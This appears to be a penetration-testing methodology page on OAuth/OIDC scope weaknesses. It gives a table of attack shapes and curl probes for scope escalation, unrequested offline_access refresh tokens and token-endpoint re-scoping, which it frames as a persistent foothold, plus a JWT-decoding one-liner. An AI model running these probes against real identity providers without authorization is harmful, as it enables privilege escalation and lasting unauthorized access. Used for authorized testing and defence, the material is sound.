# Scope — the permission surface

`scope` names the permissions the token carries. The app requests a scope;
the IdP grants one. The gap between requested and granted is the attack
surface.

## The scope claim

The `scope` in the authorize request names what the client wants: `openid`,
`profile`, `email`, `offline_access` (a refresh token), `admin`, custom
scopes. The IdP's consent page shows the user what is being granted. The
token carries the granted scope.

## The attack shapes

| Shape | The test |
|---|---|
| broader scope accepted | request `scope=openid admin` when the app registered `openid` |
| scope escalation at the token endpoint | the token request's `scope` is broader than the authorize step's |
| scope confusion across clients | client B's token carries a scope client A did not request |
| `offline_access` | a refresh token is granted when the app did not request it |
| custom scope injection | `scope=openid read:admin` — a scope the app does not know how to handle |

## The probe chain

```bash
# 1. request a broader scope
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ&scope=openid+profile+admin"
# if the consent page or the token grants admin, the scope is not validated

# 2. request offline_access — a refresh token
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=code&state=XYZ&scope=openid+offline_access"
# if the token endpoint returns a refresh_token, offline_access is granted

# 3. escalate scope at the token endpoint
curl -i -X POST "https://idp/token" \
  -d "grant_type=authorization_code&code=ABC&client_id=APP&client_secret=SECRET&redirect_uri=https://app/callback&scope=openid+admin"
# if the token carries admin, the scope is not re-validated
```

## The `offline_access` shape

A refresh token outlives the access token. When `offline_access` is granted,
the client can mint new access tokens indefinitely — a persistent foothold
that outlives the session.

```bash
# use the refresh token to mint a new access token
curl -i -X POST "https://idp/token" \
  -d "grant_type=refresh_token&refresh_token=RT&client_id=APP&client_secret=SECRET&scope=openid+admin"
```

## The scope-claim confusion

The token carries `scope` as a space-delimited string or a list. The app reads
it to decide permissions. When the app does not verify the scope against
what it requested, a token with a broader scope grants broader permissions.

```bash
# decode the token, check the scope claim
python3 -c "import base64,json; t=open('access_token.txt').read().strip(); print(json.loads(base64.urlsafe_b64decode(t.split('.')[1]+'==')))"
```

## Falsifier

`scope` is allowlisted per client, the IdP grants only what was requested,
and the token endpoint re-validates the scope against the authorize step's.
When this holds, the permission surface closes — move to state or redirect_uri.
